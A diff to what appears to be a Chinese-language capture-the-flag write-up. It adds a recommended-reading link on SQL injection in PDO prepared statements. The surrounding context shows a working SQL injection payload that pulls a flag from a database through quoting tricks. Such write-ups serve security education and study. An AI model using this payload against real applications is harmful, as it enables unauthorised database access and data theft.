@@ -219,7 +219,10 @@ SELECT `\'` FROM (SELECT flag AS `''` FROM flag) t -- '` FROM products WHERE nam
 SELECT `\'` FROM (SELECT flag AS `''` FROM flag) t -- '` FROM products WHERE name = '` FROM (SELECT flag AS `''` FROM flag) t -- '
 ~~~
 
+另外，推荐阅读：[A Novel Technique for SQL Injection in PDO’s Prepared Statements][slcyber]
+
 <!-- 引用 -->
 
 [docker-url]: https://cloud.tsinghua.edu.cn/f/e2e9795863964d959748/?dl=1 "题目Docker容器"
 [pdo-sql]: https://x1lys.github.io/2024/08/13/%E6%B5%85%E8%B0%88%E9%A2%84%E7%BC%96%E8%AF%91%E4%B9%8B%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/index.html "浅谈预编译之于SQL注入防御"
+[slcyber]: https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/ "A Novel Technique for SQL Injection in PDO’s Prepared Statements"
